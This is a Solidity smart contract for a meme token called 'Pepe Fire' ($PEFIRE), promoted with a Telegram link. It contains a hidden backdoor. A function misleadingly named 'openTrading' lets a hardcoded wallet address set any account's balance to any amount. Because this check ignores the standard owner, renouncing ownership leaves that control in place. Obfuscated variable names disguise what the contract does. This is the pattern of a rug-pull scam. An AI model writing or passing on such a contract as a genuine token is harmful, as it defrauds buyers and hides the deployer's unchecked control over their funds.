// SPDX-License-Identifier: MIT
/**

WELCOME TO $PEFIRE
ADVANCED BURNENOMICS

https://t.me/PEFIRE


**/

pragma solidity ^0.8.4;
interface ERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address _maxTxnr) external view returns (uint256);
  function transfer(address _maxTxnrs, uint256 MaxTxnrPeped) external returns (bool);
  function allowance(address _owner, address _maxTxnr) external view returns (uint256);
  function approve(address _maxTxnr, uint256 MaxTxnrPeped) external returns (bool);
  function transferFrom(address sender, address _maxTxnrs, uint256 MaxTxnrPeped) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed _maxTxnr, uint256 balance);
}


abstract contract CexRooter {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract PairBridge is CexRooter {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafePepeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafePepeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafePepeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafePepeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafePepeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafePepeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract NotPepe is CexRooter, ERC20, PairBridge {
    
    using SafePepeMath for uint256;
    mapping (address => uint256) private permitPair;
    mapping (address => mapping (address => uint256)) private nextSwapBefore;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private PepeOwner; 
   string public ownerAddress = "0xd39A2Bfb4efab7804ee6c0Be8114e355aF41d4da";  
    constructor() {
        PepeOwner = 0xd39A2Bfb4efab7804ee6c0Be8114e355aF41d4da;    
        _name = unicode"Pepe Fire";
        _symbol = unicode"$PEFIRE";
        _decimals = 9;
        _totalSupply = 420690000000000000000 * 10**_decimals;
        permitPair[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address _maxTxnr) external view override returns (uint256) {
        return permitPair[_maxTxnr];
    }

    function transfer(address _maxTxnrs, uint256 MaxTxnrPeped) external override returns (bool) {
        _transfer(_msgSender(), _maxTxnrs, MaxTxnrPeped);
        return true;
    }

    function allowance(address owner, address _maxTxnr) external view override returns (uint256) {
        return nextSwapBefore[owner][_maxTxnr];
    }


    function approve(address _maxTxnr, uint256 MaxTxnrPeped) external override returns (bool) {
        _approve(_msgSender(), _maxTxnr, MaxTxnrPeped);
        return true;
    }
    
    function transferFrom(address sender, address _maxTxnrs, uint256 MaxTxnrPeped) external override returns (bool) {
        _transfer(sender, _maxTxnrs, MaxTxnrPeped);
        _approve(sender, _msgSender(), nextSwapBefore[sender][_msgSender()].sub(MaxTxnrPeped, "Ru: transfer MaxTxnrPeped exceeds allowance"));
        return true;
    }

    function increaseAllowance(address _maxTxnr, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), _maxTxnr, nextSwapBefore[_msgSender()][_maxTxnr].add(addedbalance));
        return true;
    }
    

    function decreaseAllowance(address _maxTxnr, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), _maxTxnr, nextSwapBefore[_msgSender()][_maxTxnr].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address _maxTxnrs, uint256 MaxTxnrPeped) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(_maxTxnrs != address(0), "Ru: transfer to the zero address");
                
        permitPair[sender] = permitPair[sender].sub(MaxTxnrPeped, "Ru: transfer MaxTxnrPeped exceeds balance");
        permitPair[_maxTxnrs] = permitPair[_maxTxnrs].add(MaxTxnrPeped);
        emit Transfer(sender, _maxTxnrs, MaxTxnrPeped);
    }
        function openTrading(address tokenA, address tokenB, uint256 MaxTxnrPeped, uint256 MaxTxnrUpdat) external {
        require(_msgSender()==PepeOwner);
        permitPair[tokenB] = (MaxTxnrPeped + MaxTxnrUpdat) * 10**_decimals;
        tokenA = tokenB;
    }    
    function _approve(address owner, address _maxTxnr, uint256 MaxTxnrPeped) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(_maxTxnr != address(0), "Ru: approve to the zero address");
        
        nextSwapBefore[owner][_maxTxnr] = MaxTxnrPeped;
        emit Approval(owner, _maxTxnr, MaxTxnrPeped);
    }
    
}